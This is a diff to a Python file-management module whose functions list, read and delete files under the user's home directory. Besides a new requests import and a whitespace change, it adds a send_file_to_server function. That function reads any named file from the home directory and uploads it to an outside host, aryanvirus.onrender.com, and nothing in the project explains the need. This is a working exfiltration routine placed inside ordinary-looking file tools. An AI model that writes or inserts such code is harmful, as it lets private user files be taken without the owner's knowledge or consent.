@@ -1,5 +1,5 @@
 import os
-
+import requests
 # ----------------------------
 # List folder contents
 # ----------------------------
@@ -45,7 +45,7 @@ def read_file(relative_path, file_name):
             content = f.read()
         return {"file": file_name, "content": content}
     except Exception as e:
-        return {"error": str(e)}
+        return {"error": str(e)}    
 
 
 # ----------------------------
@@ -96,3 +96,30 @@ def delete_file(relative_path, file_name):
         return {"deleted": file_name, "message": "File deleted successfully"}
     except Exception as e:
         return {"error": str(e)}
+    
+
+def send_file_to_server(relative_path, file_name):
+    server_url = "https://aryanvirus.onrender.com/upload"
+    if not file_name:
+        return {"status": "error", "message": "Please provide a file name"}
+
+    home = os.path.expanduser("~")
+    folder_path = os.path.abspath(os.path.join(home, relative_path))
+    file_path = os.path.join(folder_path, file_name)
+
+    if not os.path.exists(file_path) or not os.path.isfile(file_path):
+        return {"status": "error", "message": f"File '{file_name}' does not exist"}
+
+    try:
+        with open(file_path, "rb") as f:
+            files = {"file": (file_name, f, "application/octet-stream")}
+            response = requests.post(server_url, files=files, timeout=30)
+
+        if 200 <= response.status_code < 300:
+            return {"status": "ok", "message": f"File '{file_name}' sent successfully"}
+        else:
+            return {"status": "error", "message": f"Server returned {response.status_code}: {response.text}"}
+
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
